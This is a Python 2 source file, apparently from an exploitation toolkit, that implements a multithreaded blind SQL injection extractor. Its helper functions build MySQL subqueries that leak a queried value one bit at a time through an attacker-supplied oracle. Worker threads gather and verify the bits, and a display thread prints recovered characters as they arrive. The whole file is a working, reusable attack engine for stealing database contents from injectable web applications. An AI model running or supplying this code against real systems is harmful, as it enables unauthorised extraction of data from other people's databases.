from pwn import align_down, unbits, sleep, text
from threading import Thread, Lock

def _req_bit(query, bytenum, bitnum):
    return '(SELECT MID(LPAD(BIN(ORD(MID((%s),%d,1))),8,0),%d,1))' % (query, bytenum + 1, bitnum + 1)

def _req_ver(query, bytenum, byte):
    return '(SELECT ORD(MID((%s),%d,1))=%d)' % (query, bytenum + 1, ord(byte))

_PROGRESS = -1

class _Worker(Thread):
    def __init__(self, env):
        Thread.__init__(self)
        self.env = env

    def run(self):
        e = self.env
        bits = e['bits']
        chrs = e['chrs']
        lock = e['lock']
        func = e['func']
        query = e['query']
        while not e['exit']:
            lock.acquire()
            n = e['next']
            while n < len(bits) and bits[n] <> None: n += 1
            if e['endp'] is not None and n >= e['endp']:
                lock.release()
                break
            if n < len(bits):
                bits[n] = _PROGRESS
            else:
                bits.append(_PROGRESS)
            lock.release()
            b = bool(int(func(_req_bit(query, n // 8, n % 8))))
            lock.acquire()
            bits[n] = b
            n = align_down(8, n)
            byte = bits[n : n + 8]
            if len(byte) < 8 or None in byte or _PROGRESS in byte:
                lock.release()
                continue
            byte = unbits(byte)
            if byte <> '\0': chrs[n // 8] = (byte, False)
            lock.release()
            if func(_req_ver(query, n // 8, byte)):
                lock.acquire()
                if byte == '\0':
                    if e['endp'] is None or e['endp'] > n:
                        e['endp'] = n
                else:
                    chrs[n // 8] = (byte, True)
                    if n == e['next']:
                        while e['next'] // 8 in chrs.keys():
                            e['next'] += 8
                lock.release()
            else:
                lock.acquire()
                if byte <> '\0': del chrs[n // 8]
                if e['next'] > n: e['next'] = n
                for n in range(n, n + 8):
                    bits[n] = None
                lock.release()

class _Scroller(Thread):
    def __init__(self, env):
        Thread.__init__(self)
        self.env = env

    def run(self):
        e = self.env
        bits = e['bits']
        chrs = e['chrs']
        lock = e['lock']
        s = ''
        while not e['exit']:
            sleep(0.1)
            s1 = ''
            if e['endp'] is not None:
                l = e['endp']
            else:
                l = len(bits)
            for i in range(l // 8):
                if i in chrs:
                    c, v = chrs[i]
                    if v:
                        s1 += text.green(c)
                    else:
                        s1 += text.red(c)
                else:
                    s1 += '.'
            if s <> s1:
                s = s1
                lock.acquire()
                # BETTER OUTPUT PLZ
                print s
                lock.release()
            if e['endp'] is not None and len(chrs) == e['endp'] // 8:
                break

def bitwise(func, query, threads = 20):
    env = {
        'query': query,
        'next' : 0,
        'endp' : None,
        'bits' : [], # None = no progress, -1 = in progres, 1, 0
        'chrs' : {},
        'lock' : Lock(),
        'exit' : False,
        'func' : func,
        }
    for _ in range(threads):
        t = _Worker(env)
        t.daemon = True
        t.start()
    scroller = _Scroller(env)
    scroller.start()
    while scroller.isAlive():
        try:
            scroller.join(0.1)
        except KeyboardInterrupt:
            env['exit'] = True
    if env['exit']:
        return None
    else:
        return ''.join(map(lambda x: x[0], env['chrs'].values()))
